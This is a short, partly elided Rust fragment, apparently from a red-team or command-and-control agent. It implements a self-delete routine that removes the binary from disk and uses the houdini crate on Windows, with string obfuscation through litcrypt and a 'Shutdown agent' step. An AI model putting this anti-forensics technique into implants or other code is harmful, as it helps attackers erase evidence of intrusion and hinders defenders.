use std::error::Error;
#[cfg(not(windows))] use std::env::args;
#[cfg(not(windows))] use std::fs::remove_file;
use litcrypt::lc;
...
/// For Windows, makes use of Yamakadi's fantastic houdini crate, 
/// based on jonaslyk's self-deleting binary research and byt3bl33d3r's Nim POC
...
pub async fn handle() -> Result<String, Box<dyn Error>> {
        ...
        #[cfg(windows)] {
                ...
                houdini::disappear_with_placeholder(rand_string).unwrap();
                // Shutdown agent
